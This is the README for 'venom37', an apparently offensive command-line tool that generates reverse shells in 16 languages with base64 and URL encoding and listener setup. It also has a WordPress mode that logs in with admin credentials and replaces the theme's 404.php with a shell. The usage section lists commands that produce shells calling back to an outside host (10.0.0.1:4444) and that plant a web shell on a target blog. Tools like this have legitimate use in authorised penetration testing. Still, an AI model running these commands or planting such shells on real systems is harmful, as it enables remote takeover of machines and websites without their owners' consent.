# venom37

Reverse shell generator. 16 shell types, encoding options, listener commands, and WordPress injection. Because copy-pasting from pentestmonkey is beneath you.

## Install

```bash
cd venom37/
pip install -e .
```

## Usage

```bash
# Generate a bash reverse shell
venom37 gen bash 10.0.0.1 4444

# Shortcuts — skip the 'gen' subcommand
venom37 bash 10.0.0.1 4444
venom37 php 10.0.0.1 4444
venom37 python 10.0.0.1 4444
venom37 nc 10.0.0.1 4444
venom37 powershell 10.0.0.1 4444

# With encoding
venom37 gen php 10.0.0.1 4444 --encode base64
venom37 gen bash 10.0.0.1 4444 --encode url

# Include listener command in output
venom37 gen bash 10.0.0.1 4444 --with-listener --human

# Choose listener type
venom37 gen bash 10.0.0.1 4444 --listener socat --with-listener

# Explain what the shell does
venom37 gen python 10.0.0.1 4444 --explain

# List all 16 shell types
venom37 list --human

# WordPress theme injection (requires admin creds)
venom37 wp-inject -t http://target/blog -u admin -p password \
  --lhost 10.0.0.1 --lport 4444 --human
```

## Features

- **16 shell types** — bash, sh, php, python, perl, ruby, nc, ncat, socat, lua, java, node, groovy, powershell, and more
- **Encoding** — base64, URL, double-URL encoding
- **Listener commands** — nc, socat, pwncat, rlwrap, msfconsole
- **WordPress injection** — log in as admin, replace 404.php with a shell, get trigger URL
- **Explain mode** — tells you what the payload does before you use it
- **Shortcuts** — `venom37 bash 10.0.0.1 4444` just works
- **JSON + human output** — pipe it or read it

## Dependencies

httpx, rich, click.
